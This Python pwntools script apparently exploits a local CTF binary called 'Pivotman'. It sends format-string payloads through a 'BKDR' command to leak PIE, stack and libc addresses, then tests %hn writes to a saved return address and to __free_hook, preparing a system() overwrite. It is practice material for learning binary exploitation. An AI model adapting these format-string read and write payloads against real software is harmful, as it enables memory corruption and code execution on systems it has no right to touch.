#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

CHALL_DIR = '/home/gluppler/Downloads/CTFs-Testing/Pwn/Easy/Pivotman/pwn_pivotman/challenge'
ELF_PATH = f'{CHALL_DIR}/chall'
LD_PATH = f'{CHALL_DIR}/ld-linux-x86-64.so.2'
LIBC_PATH = f'{CHALL_DIR}/libc.so.6'

p = process([LD_PATH, ELF_PATH], cwd=CHALL_DIR)
p.recvuntil(b' \r\n', timeout=5)
p.sendline(b'USER ;)')
p.recvuntil(b' \r\n')
p.sendline(b'PASS ;)')
p.recvuntil(b' \r\n')

# Leak PIE + saved_rbp + libc
p.sendline(b'BKDR %2737$p.%2736$p')
resp = p.recvuntil(b' \r\n')
marker = b' BKDR '
idx = resp.find(marker)
after = resp[idx + len(marker):]
parts = after.split(b'.')
pie_base = int(parts[0], 16) - 0x3a10
saved_rbp = int(parts[1], 16)

libc_base = None
if not libc_base:
    puts_got = pie_base + 0x5ed8
    payload2 = b'BKDR ' + b'%1032$sA' + p64(puts_got)
    p.sendline(payload2)
    data = p.recvuntil(b'A', timeout=5)
    idx = data.find(b' BKDR ')
    leaked = data[idx + 6:-1]
    puts_addr = u64(leaked[:8].ljust(8, b'\x00'))
    libc_base = puts_addr - 0x809d0

log.info(f'PIE: {hex(pie_base)}, saved_rbp: {hex(saved_rbp)}, libc: {hex(libc_base)}')

# Test 1: Just print position 1037 with an embedded address (no write)
# Position 1037 = buffer[56:64]
# My input needs address at input[53] (= buffer[56])
known = 0xDEADBEEFCAFE1234
fmt = b'%1037$p'  # 7 bytes
prefix = b'BKDR '  # 5 bytes
# Total before address: 5 + 7 = 12
# Need input[53] to be start of address
# padding = 53 - 12 = 41
padding = 41
payload = prefix + fmt + b'.' * padding + p64(known)
log.info(f'Test1 payload: {len(payload)} bytes (expect 61: 5+7+41+8)')
p.sendline(payload)
resp = p.recvuntil(b' \r\n')
log.info(f'Test1: {resp}')
# Expected: "431136 BKDR 0xdeadbeefcafe1234" + garbage address bytes

# Test 2: Write to stack (saved_rbp) - definitely writable
# Write 0x4141 to [saved_rbp] using %1037$hn
ret_addr_loc = saved_rbp - 8  # return address location of BKDR handler
test_val = 0x4141  # test pattern
# Build: %<delta>c%1037$hn + padding + p64(ret_addr_loc)
# delta = (test_val - 0) % 0x10000 = test_val (since first write, start at 0)
delta = test_val
fmt2 = f'%{delta}c%1037$hn'.encode()
prefix2 = b'BKDR '
total_before = len(prefix2) + len(fmt2)
padding2 = 53 - total_before
payload2 = prefix2 + fmt2 + b'.' * padding2 + p64(ret_addr_loc)
log.info(f'Test2 payload: {len(payload2)} bytes, target={hex(ret_addr_loc)}, val={hex(test_val)}')
p.sendline(payload2)
# After the write, the program should survive
import time
time.sleep(1)
try:
    p.sendline(b'BKDR %2737$p')
    resp2 = p.recvuntil(b' \r\n', timeout=3)
    log.info(f'Test2 alive: {resp2[:100]}')
except:
    log.error('Test2 crashed')

# Test 3: Write to __free_hook if we have libc
libc = ELF(LIBC_PATH, checksec=False)
free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
log.info(f'free_hook: {hex(free_hook)}, system: {hex(system_addr)}')

# Write lower 6 bytes (3 half-words) of system to __free_hook
# Test 3a: Just write 0x4141 to test writability
delta = 0x4141  # just write test pattern to free_hook+0
fmt3 = f'%{delta}c%1037$hn'.encode()
prefix3 = b'BKDR '
total_before3 = len(prefix3) + len(fmt3)
padding3 = 53 - total_before3
payload3 = prefix3 + fmt3 + b'.' * padding3 + p64(free_hook)
log.info(f'Test3 payload: {len(payload3)} bytes, target={hex(free_hook)}, val={hex(0x4141)}')
p.sendline(payload3)
time.sleep(1)
try:
    p.sendline(b'BKDR %2737$p')
    resp3 = p.recvuntil(b' \r\n', timeout=3)
    log.info(f'Test3 alive: {resp3[:100]}')
except:
    log.error('Test3 crashed')

p.close()
